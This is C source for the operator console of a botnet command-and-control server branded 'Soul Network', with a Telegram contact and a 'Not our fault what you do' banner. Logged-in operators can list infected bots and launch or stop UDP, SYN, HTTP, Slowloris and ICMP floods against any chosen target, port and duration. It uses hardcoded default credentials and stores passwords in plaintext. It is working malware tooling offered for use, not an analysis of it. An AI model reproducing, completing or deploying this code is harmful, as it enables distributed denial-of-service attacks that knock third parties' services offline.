#include "ssh_service.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <ctype.h>

// Global users database
user_t users[100];
int user_count = 0;
int ssh_service_running = 1;

// Default users (will be overwritten by file)
void create_default_users() {
    strcpy(users[0].username, "admin");
    strcpy(users[0].password, "admin123");
    users[0].privilege_level = 1;
    
    strcpy(users[1].username, "user");
    strcpy(users[1].password, "user123");
    users[1].privilege_level = 2;
    
    user_count = 2;
}

void load_users_from_file() {
    FILE* file = fopen(USERS_FILE, "r");
    if (!file) {
        printf("Creating default users file...\n");
        create_default_users();
        save_users_to_file();
        return;
    }
    
    user_count = 0;
    char line[256];
    while (fgets(line, sizeof(line), file) && user_count < 100) {
        char username[MAX_USERNAME_LEN];
        char password[MAX_PASSWORD_LEN];
        int privilege;
        
        if (sscanf(line, "%49[^:]:%49[^:]:%d", username, password, &privilege) == 3) {
            strcpy(users[user_count].username, username);
            strcpy(users[user_count].password, password);
            users[user_count].privilege_level = privilege;
            user_count++;
        }
    }
    fclose(file);
    
    if (user_count == 0) {
        create_default_users();
        save_users_to_file();
    }
}

// Add the missing save_users_to_file function
void save_users_to_file() {
    FILE* file = fopen(USERS_FILE, "w");
    if (!file) {
        printf("Error: Could not create users file\n");
        return;
    }
    
    for (int i = 0; i < user_count; i++) {
        fprintf(file, "%s:%s:%d\n", users[i].username, users[i].password, users[i].privilege_level);
    }
    fclose(file);
}

int authenticate_user(const char* username, const char* password, user_t* user) {
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].username, username) == 0 && 
            strcmp(users[i].password, password) == 0) {
            *user = users[i];
            return 1;
        }
    }
    return 0;
}

void ssh_send_banner(int client_socket) {
    char banner[1024];
    time_t now = time(NULL);
    char time_str[26];
    ctime_r(&now, time_str);
    time_str[24] = '\0'; // Remove newline
    
    snprintf(banner, sizeof(banner),
        "\033[1;32m\n"
        "╔════════════════════════════════════════════════════════════════╗\n"
        "║                         SOUL NETWORK.v3                        ║\n"
        "║                    TeleG  https://t.me/yonqv168j               ║\n"
        "║                      Not our fault what you do :)              ║\n"
        "║                                                                ║\n"
        "║                    Welcome to the Soul Network!                ║\n"
        "║                        Connection Time: %s                     ║\n"
        "╚════════════════════════════════════════════════════════════════╝\n"
        "\033[0m\n", time_str);
    
    send(client_socket, banner, strlen(banner), 0);
}

void ssh_help(client_session_t* session) {
    char help_msg[2048];
    
    if (session->user.privilege_level == 1) {
        // Admin commands
        snprintf(help_msg, sizeof(help_msg),
            "\033[1;36mAvailable Commands:\033[0m\n"
            "  help                    - Show this help message\n"
            "  bots                    - List connected bots\n"
            "  attacks                 - Show active attacks\n"
            "  attack <method> <target> <port> <time> <threads>\n"
            "                          - Start an attack\n"
            "  stop <attack_id>        - Stop specific attack\n"
            "  stop all                - Stop all attacks\n"
            "  methods                 - Show attack methods\n"
            "  system                  - Show system info\n"
            "  clear                   - Clear screen\n"
            "  exit                    - Logout\n"
            "\n\033[1;33mAttack Methods:\033[0m UDP-FLOOD, TCP-SYN, HTTP-FLOOD, SLOWLORIS, ICMP-FLOOD\n");
    } else {
        // User commands
        snprintf(help_msg, sizeof(help_msg),
            "\033[1;36mAvailable Commands:\033[0m\n"
            "  help                    - Show this help message\n"
            "  bots                    - List connected bots\n"
            "  attacks                 - Show active attacks\n"
            "  attack <method> <target> <port> <time> <threads>\n"
            "                          - Start an attack\n"
            "  stop <attack_id>        - Stop specific attack\n"
            "  methods                 - Show attack methods\n"
            "  system                  - Show system info\n"
            "  clear                   - Clear screen\n"
            "  exit                    - Logout\n"
            "\n\033[1;33mAttack Methods:\033[0m UDP-FLOOD, TCP-SYN, HTTP-FLOOD, SLOWLORIS\n");
    }
    
    send(session->client_socket, help_msg, strlen(help_msg), 0);
}

// Real bot list display
void ssh_list_bots(client_session_t* session) {
    (void)session; // Mark parameter as used
    
    // Get real bot data from main C&C
    bot_t* bots = get_bots_list();
    int bot_count = get_bot_count();
    
    char response[4096]; // Larger buffer for real data
    char* ptr = response;
    int remaining = sizeof(response);
    
    int len = snprintf(ptr, remaining,
        "\033[1;35mConnected Bots:\033[0m\n"
        "┌──────────┬─────────────────┬────────┬────────────────────┐\n"
        "│   ID     │      IP         │  Port  │    Last Seen       │\n"
        "├──────────┼─────────────────┼────────┼────────────────────┤\n");
    ptr += len;
    remaining -= len;
    
    int active_bots = 0;
    for (int i = 0; i < bot_count && remaining > 0; i++) {
        if (bots[i].active) {
            char time_str[20];
            strftime(time_str, sizeof(time_str), "%H:%M:%S %m-%d", localtime(&bots[i].last_seen));
            
            len = snprintf(ptr, remaining, "│ %-8s │ %-15s │ %-6d │ %-18s │\n", 
                          bots[i].id, bots[i].ip, bots[i].port, time_str);
            ptr += len;
            remaining -= len;
            active_bots++;
        }
    }
    
    if (remaining > 0) {
        len = snprintf(ptr, remaining, 
            "└──────────┴─────────────────┴────────┴────────────────────┘\n"
            "Total: %d bots connected\n", active_bots);
    }
    
    send(session->client_socket, response, strlen(response), 0);
}

// Real attack list display
void ssh_list_attacks(client_session_t* session) {
    (void)session; // Mark parameter as used
    
    // Get real attack data from main C&C
    attack_t* attacks = get_attacks_list();
    int attack_count = get_attack_count();
    
    char response[4096];
    char* ptr = response;
    int remaining = sizeof(response);
    
    int len = snprintf(ptr, remaining,
        "\033[1;35mActive Attacks:\033[0m\n"
        "┌────┬────────────┬──────────────────┬──────┬────────┬─────────┐\n"
        "│ ID │   Method   │      Target      │ Port │  Time  │ Threads │\n"
        "├────┼────────────┼──────────────────┼──────┼────────┼─────────┤\n");
    ptr += len;
    remaining -= len;
    
    int active_attacks = 0;
    time_t current_time = time(NULL);
    
    for (int i = 0; i < attack_count && remaining > 0; i++) {
        if (attacks[i].active) {
            int elapsed = current_time - attacks[i].start_time;
            int remaining_time = attacks[i].duration - elapsed;
            if (remaining_time < 0) remaining_time = 0;
            
            len = snprintf(ptr, remaining, "│ %-2d │ %-10s │ %-16s │ %-4d │ %-6d │ %-7d │\n", 
                          attacks[i].id, attacks[i].method, attacks[i].target, 
                          attacks[i].port, remaining_time, attacks[i].threads);
            ptr += len;
            remaining -= len;
            active_attacks++;
        }
    }
    
    if (remaining > 0) {
        len = snprintf(ptr, remaining, 
            "└────┴────────────┴──────────────────┴──────┴────────┴─────────┘\n"
            "Total: %d active attacks\n", active_attacks);
    }
    
    send(session->client_socket, response, strlen(response), 0);
}

void ssh_start_attack(client_session_t* session, const char* command) {
    char response[512];
    
    if (session->user.privilege_level > 1) {
        snprintf(response, sizeof(response), 
            "\033[1;31mError: Insufficient privileges to start attacks\033[0m\n");
        send(session->client_socket, response, strlen(response), 0);
        return;
    }
    
    // Parse attack command
    char method[50], target[256];
    int port, duration, threads;
    
    if (sscanf(command, "attack %49s %255s %d %d %d", method, target, &port, &duration, &threads) == 5) {
        // Start real attack through main C&C
        start_real_attack(method, target, port, duration, threads);
        
        snprintf(response, sizeof(response),
            "\033[1;32mAttack started successfully!\033[0m\n"
            "Method: %s | Target: %s:%d | Duration: %ds | Threads: %d\n",
            method, target, port, duration, threads);
    } else {
        snprintf(response, sizeof(response),
            "\033[1;31mError: Invalid command format\033[0m\n"
            "Usage: attack <method> <target> <port> <time> <threads>\n");
    }
    
    send(session->client_socket, response, strlen(response), 0);
}

void ssh_stop_attack(client_session_t* session, const char* command) {
    char response[512];
    
    if (session->user.privilege_level > 1) {
        snprintf(response, sizeof(response), 
            "\033[1;31mError: Insufficient privileges to stop attacks\033[0m\n");
        send(session->client_socket, response, strlen(response), 0);
        return;
    }
    
    int attack_id;
    if (sscanf(command, "stop %d", &attack_id) == 1) {
        stop_real_attack(attack_id);
        snprintf(response, sizeof(response), "\033[1;32mAttack #%d stopped\033[0m\n", attack_id);
    } else if (strcmp(command, "stop all") == 0) {
        stop_all_real_attacks();
        snprintf(response, sizeof(response), "\033[1;32mAll attacks stopped\033[0m\n");
    } else {
        snprintf(response, sizeof(response), 
            "\033[1;31mError: Invalid command\033[0m\n"
            "Usage: stop <attack_id> or 'stop all'\n");
    }
    
    send(session->client_socket, response, strlen(response), 0);
}

void ssh_system_info(client_session_t* session) {
    char info[1024];
    time_t now = time(NULL);
    char time_str[26];
    ctime_r(&now, time_str);
    time_str[24] = '\0';
    
    // Get real data
    int bot_count = get_bot_count();
    int attack_count = get_attack_count();
    int active_bots = 0;
    int active_attacks = 0;
    
    bot_t* bots = get_bots_list();
    attack_t* attacks = get_attacks_list();
    
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].active) active_bots++;
    }
    for (int i = 0; i < attack_count; i++) {
        if (attacks[i].active) active_attacks++;
    }
    
    snprintf(info, sizeof(info),
        "\033[1;36mSystem Information:\033[0m\n"
        "┌────────────────────────────────┬─────────────────────────────┐\n"
        "│ Service                        │ Soul-Net stuff              │\n"
        "│ Start Time                     │ %s │\n"
        "│ Connected Bots                 │ %-29d │\n"
        "│ Active Attacks                 │ %-29d │\n"
        "│ Total Bots                     │ %-29d │\n"
        "│ User Privilege                 │ %-29s │\n"
        "│ SSH Port                       │ %-29d │\n"
        "│ C&C Port                       │ %-29d │\n"
        "└────────────────────────────────┴─────────────────────────────┘\n",
        time_str,
        active_bots,
        active_attacks,
        bot_count,
        (session->user.privilege_level == 1) ? "Administrator" : "User",
        SSH_PORT,
        1337);
    
    send(session->client_socket, info, strlen(info), 0);
}

void ssh_command_loop(client_session_t* session) {
    char buffer[1024];
    char prompt[100];
    
    snprintf(prompt, sizeof(prompt), "\033[1;32m%s@Soul-Net\033[0m:\033[1;34m~$\033[0m ", 
             session->user.username);
    
    while (session->authenticated) {
        // Send prompt
        send(session->client_socket, prompt, strlen(prompt), 0);
        
        // Receive command
        int bytes_received = recv(session->client_socket, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            break;
        }
        
        buffer[bytes_received] = '\0';
        
        // Remove newline
        buffer[strcspn(buffer, "\r\n")] = '\0';
        
        // Process command
        if (strcmp(buffer, "help") == 0) {
            ssh_help(session);
        }
        else if (strcmp(buffer, "bots") == 0) {
            ssh_list_bots(session);
        }
        else if (strcmp(buffer, "attacks") == 0) {
            ssh_list_attacks(session);
        }
        else if (strncmp(buffer, "attack ", 7) == 0) {
            ssh_start_attack(session, buffer);
        }
        else if (strncmp(buffer, "stop ", 5) == 0) {
            ssh_stop_attack(session, buffer);
        }
        else if (strcmp(buffer, "stop all") == 0) {
            ssh_stop_attack(session, buffer);
        }
        else if (strcmp(buffer, "system") == 0) {
            ssh_system_info(session);
        }
        else if (strcmp(buffer, "methods") == 0) {
            char methods[512] = "\033[1;36mAvailable Attack Methods:\033[0m\n"
                "UDP-FLOOD    - UDP flood attack\n"
                "TCP-SYN      - TCP SYN flood\n"
                "HTTP-FLOOD   - HTTP request flood\n"
                "SLOWLORIS    - Slowloris attack\n"
                "ICMP-FLOOD   - ICMP ping flood\n";
            send(session->client_socket, methods, strlen(methods), 0);
        }
        else if (strcmp(buffer, "clear") == 0) {
            send(session->client_socket, "\033[2J\033[1;1H", 10, 0);
            ssh_send_banner(session->client_socket);
        }
        else if (strcmp(buffer, "exit") == 0) {
            send(session->client_socket, "Goodbye!\n", 9, 0);
            break;
        }
        else if (strlen(buffer) > 0) {
            char error_msg[100];
            snprintf(error_msg, sizeof(error_msg), "Unknown command: %s\n", buffer);
            send(session->client_socket, error_msg, strlen(error_msg), 0);
        }
    }
}

void* handle_ssh_client(void* arg) {
    client_session_t* session = (client_session_t*)arg;
    char buffer[256];
    
    // Send welcome message
    ssh_send_banner(session->client_socket);
    
    // Authentication loop
    int auth_attempts = 0;
    while (auth_attempts < 3 && !session->authenticated) {
        // Ask for username
        send(session->client_socket, "Username: ", 10, 0);
        int bytes = recv(session->client_socket, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) break;
        buffer[bytes] = '\0';
        buffer[strcspn(buffer, "\r\n")] = '\0';
        
        char username[MAX_USERNAME_LEN];
        strncpy(username, buffer, sizeof(username) - 1);
        
        // Ask for password
        send(session->client_socket, "Password: ", 10, 0);
        bytes = recv(session->client_socket, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) break;
        buffer[bytes] = '\0';
        buffer[strcspn(buffer, "\r\n")] = '\0';
        
        char password[MAX_PASSWORD_LEN];
        strncpy(password, buffer, sizeof(password) - 1);
        
        // Authenticate
        if (authenticate_user(username, password, &session->user)) {
            session->authenticated = 1;
            char welcome[100];
            snprintf(welcome, sizeof(welcome), 
                    "\n\033[1;32mAuthentication successful! Welcome %s!\033[0m\n\n", 
                    session->user.username);
            send(session->client_socket, welcome, strlen(welcome), 0);
        } else {
            auth_attempts++;
            send(session->client_socket, "\033[1;31mAuthentication failed!\033[0m\n", 35, 0);
        }
    }
    
    if (session->authenticated) {
        ssh_command_loop(session);
    } else {
        send(session->client_socket, "Too many failed attempts. Disconnecting.\n", 42, 0);
    }
    
    close(session->client_socket);
    free(session);
    return NULL;
}

void start_ssh_service() {
    load_users_from_file();
    
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("SSH: Socket creation failed");
        return;
    }
    
    // Set socket options
    int opt = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(SSH_PORT);
    
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("SSH: Bind failed");
        close(server_socket);
        return;
    }
    
    if (listen(server_socket, MAX_CLIENTS) < 0) {
        perror("SSH: Listen failed");
        close(server_socket);
        return;
    }
    
    printf("\033[1;32m[SSH] Service started on port %d\033[0m\n", SSH_PORT);
    printf("\033[1;33m[SSH] Default credentials: admin/admin123 or user/user123\033[0m\n");
    
    while (ssh_service_running) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        
        int client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
        if (client_socket < 0) {
            perror("SSH: Accept failed");
            continue;
        }
        
        printf("\033[1;36m[SSH] New connection from %s:%d\033[0m\n", 
               inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
        
        // Create client session
        client_session_t* session = malloc(sizeof(client_session_t));
        session->client_socket = client_socket;
        session->client_addr = client_addr;
        session->authenticated = 0;
        
        // Handle client in separate thread
        pthread_t client_thread;
        pthread_create(&client_thread, NULL, handle_ssh_client, session);
        pthread_detach(client_thread);
    }
    
    close(server_socket);
}
